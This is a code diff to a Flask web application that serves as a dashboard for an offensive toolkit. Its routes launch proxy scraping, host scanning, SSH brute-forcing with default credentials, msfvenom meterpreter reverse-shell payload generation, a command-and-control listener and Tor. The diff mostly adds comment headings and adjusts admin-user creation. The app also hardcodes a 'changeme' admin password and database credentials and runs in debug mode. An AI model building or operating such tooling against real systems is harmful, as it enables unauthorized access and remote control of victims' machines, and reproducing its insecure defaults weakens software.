@@ -29,7 +29,7 @@ app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://scanner_user:password@l
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 db = SQLAlchemy(app)
 
-# User Model
+# --- 🔹 User Model ---
 class User(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     username = db.Column(db.String(50), unique=True, nullable=False)
@@ -39,29 +39,32 @@ class User(db.Model):
     def check_password(self, password):
         return check_password_hash(self.password_hash, password)
 
+# --- 🔹 Fix `before_first_request` for Admin User Creation ---
 @app.before_first_request
 def create_admin_user():
     """Create an admin user if one doesn't exist."""
-    admin = User.query.filter_by(username="admin").first()
-    if not admin:
-        hashed_pw = generate_password_hash("changeme", method="pbkdf2:sha256")
-        new_admin = User(username="admin", password_hash=hashed_pw, first_login=True)
-        db.session.add(new_admin)
-        db.session.commit()
-        print("[INFO] Default admin user created. Please change your password.")
+    with app.app_context():
+        db.create_all()  # Ensure all tables exist
+        admin = User.query.filter_by(username="admin").first()
+        if not admin:
+            hashed_pw = generate_password_hash("changeme", method="pbkdf2:sha256")
+            new_admin = User(username="admin", password_hash=hashed_pw, first_login=True)
+            db.session.add(new_admin)
+            db.session.commit()
+            print("[INFO] Default admin user created. Please change your password.")
 
 # **Fix Start WebApp Function**
 def start_webapp():
     print("[INFO] Starting Flask Web Server...")
     app.run(host=web_config["host"], port=web_config["port"], debug=True)
 
-# --- LOGIN & AUTHENTICATION ---
+# --- 🔹 LOGIN & AUTHENTICATION ---
 @app.route("/")
 def home():
     if "user" not in session:
         return redirect("/login")
     return render_template("index.html")
-    
+
 @app.route("/login", methods=["GET", "POST"])
 def login():
     """Handles user authentication"""
@@ -93,6 +96,7 @@ def dashboard():
 
     return render_template("index.html")
 
+# --- 🔹 API FOR REAL-TIME STATS ---
 @app.route("/stats")
 def stats():
     """API for real-time statistics"""
@@ -103,7 +107,7 @@ def stats():
         "tasks": len(active_tasks)
     })   
 
-# --- PROXY MANAGEMENT ---
+# --- 🔹 PROXY MANAGEMENT ---
 @app.route("/proxies/scrape", methods=["POST"])
 def scrape_proxies_route():
     scrape_proxies()
@@ -124,7 +128,7 @@ def save_proxies_route():
     save_working_proxies()
     return jsonify({"message": "Valid Proxies Saved!"}), 200
 
-# --- HOST MANAGEMENT ---
+# --- 🔹 HOST MANAGEMENT ---
 @app.route("/hosts/load", methods=["POST"])
 def load_hosts_route():
     load_hosts()
@@ -140,7 +144,7 @@ def scan_hosts_route():
     scan_hosts()
     return jsonify({"message": "Host Scanning Started!"}), 200
 
-# --- BRUTEFORCE ---
+# --- 🔹 BRUTEFORCE ---
 @app.route("/bruteforce/start", methods=["POST"])
 def start_bruteforce_route():
     bruteforce_ssh(load_hosts(), ["admin"], ["password"])
@@ -150,13 +154,13 @@ def start_bruteforce_route():
 def stop_bruteforce_route():
     return jsonify({"message": "Brute-force Stopped!"}), 200
 
-# --- SHELL GENERATOR ---
+# --- 🔹 SHELL GENERATOR ---
 @app.route("/shell/generate", methods=["POST"])
 def generate_shell_route():
     generate_msfvenom_shell("windows/meterpreter/reverse_tcp", "127.0.0.1", "4444", "exe", "payload.exe")
     return jsonify({"message": "Payload Generated!"}), 200
 
-# --- COMMAND & CONTROL ---
+# --- 🔹 COMMAND & CONTROL ---
 @app.route("/c2/start", methods=["POST"])
 def start_c2_route():
     start_listener()
@@ -167,7 +171,7 @@ def stop_c2_route():
     stop_listeners()
     return jsonify({"message": "C2 Server Stopped!"}), 200
 
-# --- TOR PROXY ---
+# --- 🔹 TOR PROXY ---
 @app.route("/tor/start", methods=["POST"])
 def start_tor_route():
     start_tor()
